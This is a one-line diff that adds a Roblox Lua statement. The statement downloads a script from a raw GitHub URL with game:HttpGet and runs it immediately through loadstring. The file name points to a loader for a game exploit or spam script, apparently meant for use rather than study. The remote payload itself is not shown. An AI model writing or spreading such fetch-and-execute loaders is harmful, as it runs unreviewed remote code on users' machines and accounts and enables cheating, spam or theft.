@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/lethal-ape-experience-spam3-hcgqvhuvo0kv2v.lua"))()
